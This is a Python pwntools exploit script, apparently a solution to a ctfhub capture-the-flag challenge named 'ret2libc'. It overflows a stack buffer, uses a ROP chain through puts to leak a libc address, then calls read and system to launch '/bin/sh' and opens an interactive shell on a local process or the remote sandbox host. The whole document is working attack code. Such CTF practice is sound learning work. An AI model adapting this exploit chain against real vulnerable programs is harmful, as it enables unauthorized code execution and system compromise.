from pwn import * 
from pwn import p64


debug = 1
gdb_is = 0

# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./ret2libc")
else:
    host = "challenge-127cef38a731fb4a.sandbox.ctfhub.com"
    r = connect(host,20625)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x400690')
    pause()
    pass

plt_puts = 0x4004e0
pop_rdi = 0x0400703

elf = ELF('./ret2libc')  
libc = ELF('./libc.so')

payload = b'A'*0x90 + b'junkjunk' + p64(pop_rdi) + p64(elf.got['puts'])  + p64(plt_puts) + p64(0x400626)#main
r.sendafter(b'ctfhub',payload)
r.recv()
response = r.recv(6)
puts_addr = u64(response.ljust(8,b'\x00')) 
libc_addr = puts_addr - libc.sym['puts']
libc.address = libc_addr
pop_rsi = 0x00202f8 + libc_addr
pop_rdx = 0x001b92 + libc_addr

print(f'response = {response}')
print(f'puts_addr = {hex(puts_addr)}')
payload = b'A'*0x90 + b'junkjunk' + p64(pop_rdi) +p64(0)+ p64(pop_rsi) + p64(0x601038) + p64(pop_rdx) + p64(0x10)  + p64(libc.sym['read']) + p64(0x400626)
r.sendafter(b'ctfhub',payload)
r.send(b'/bin/sh\x00')

payload = b'A'*0x90 + b'junkjunk' + p64(pop_rdi) + p64(0x601038) + p64(libc.sym['system'])
r.sendafter(b'ctfhub',payload)
r.interactive()

